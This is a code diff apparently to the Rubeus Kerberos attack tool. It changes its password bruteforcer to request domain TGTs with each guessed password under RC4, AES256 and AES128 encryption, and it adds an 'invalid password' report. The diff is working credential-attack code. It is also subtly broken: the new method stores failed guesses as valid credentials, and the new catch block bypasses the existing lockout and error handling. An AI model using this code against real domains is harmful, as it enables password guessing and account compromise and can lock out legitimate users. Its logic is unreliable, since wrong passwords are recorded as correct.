@@ -7,6 +7,7 @@ namespace Rubeus
     public interface IBruteforcerReporter
     {
         void ReportValidPassword(string domain, string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE);
+        void ReportInvalidPassword(string domain, string username, string password);
         void ReportValidUser(string domain, string username);
         void ReportInvalidUser(string domain, string username);
         void ReportBlockedUser(string domain, string username);
@@ -71,23 +72,81 @@ namespace Rubeus
 
         private void GetUsernamePasswordTGT(string username, string password)
         {
-            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
-            string salt = String.Format("{0}{1}", domain.ToUpper(), username);
-
-            // special case for computer account salts
-            if (username.EndsWith("$"))
+            // List all possible encryption types you want to check
+            var encTypes = new[]
             {
-                salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), username.TrimEnd('$').ToLower(), domain.ToLower());
+                Interop.KERB_ETYPE.rc4_hmac,
+                Interop.KERB_ETYPE.aes256_cts_hmac_sha1,
+                Interop.KERB_ETYPE.aes128_cts_hmac_sha1,
+                // Add more as needed
+            };
+            bool login = false;
+            byte[] TGT = null;
+
+            foreach (var encType in encTypes)
+            {
+                login = false;
+                try
+                {
+                    Console.WriteLine($"[*] Using domain controller: {this.dc}");
+                    Console.WriteLine($"[*] Trying encryption type: {encType}");
+
+                    string salt = String.Format("{0}{1}", domain.ToUpper(), username);
+
+                    // Special case for computer account salts
+                    if (username.EndsWith("$"))
+                    {
+                        salt = String.Format("{0}host{1}.{2}", domain.ToUpper(), username.TrimEnd('$').ToLower(), domain.ToLower());
+                    }
+
+                    string hash = Crypto.KerberosPasswordHash(encType, password, salt);
+
+                    AS_REQ unpwAsReq = AS_REQ.NewASReq(username, domain, hash, encType);
+
+                    TGT = Ask.InnerTGT(unpwAsReq, encType, null, false, this.dc);
+
+                    if (TGT == null || TGT.Length == 0)
+                    {
+                        Console.WriteLine($"Encryption type {encType} did not return a valid TGT.");
+                    }
+                    else
+                    {
+                        Console.WriteLine($"Encryption type {encType} is supported.");
+                        login = true;
+                        break;
+                    }
+                }
+                catch (KerberosErrorException kex)
+                {
+
+                    KRB_ERROR error = kex.krbError;
+                    try
+                    {
+                        Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}: {2}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code, error.e_text);
+                        if (error.e_data[0].type == Interop.PADATA_TYPE.SUPERSEDED_BY_USER)
+                        {
+                            PA_SUPERSEDED_BY_USER obj = (PA_SUPERSEDED_BY_USER)error.e_data[0].value;
+                            Console.WriteLine("[*] {0} is superseded by {1}", username, obj.name.name_string[0]);
+                        }
+
+                    }
+                    catch
+                    {
+                        Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
+                    }
+                }
             }
-
-            string hash = Crypto.KerberosPasswordHash(encType, password, salt);
-
-            AS_REQ unpwAsReq = AS_REQ.NewASReq(username, domain, hash, encType);
-
-            byte[] TGT = Ask.InnerTGT(unpwAsReq, encType, null, false, this.dc);
-
-            this.ReportValidPassword(username, password, TGT);
+            if (login)
+            {
+                this.ReportValidPassword(username, password, TGT);
+            }
+            else
+            {
+                this.ReportInvalidPassword(username, password);
+            }
         }
+
+
 
         private bool HandleKerberosError(KerberosErrorException ex, string username, string password)
         {
@@ -172,6 +231,19 @@ namespace Rubeus
         {
             this.reporter.ReportKrbError(this.domain, username, krbError);
         }
+
+        private void ReportInvalidPassword(string username, string password)
+        {
+
+            validCredentials.Add(username, password);
+            if (!validUsers.ContainsKey(username))
+            {
+                validUsers.Add(username, true);
+            }
+            this.reporter.ReportInvalidPassword(this.domain, username, password);
+        }
+
+
 
     }
 }
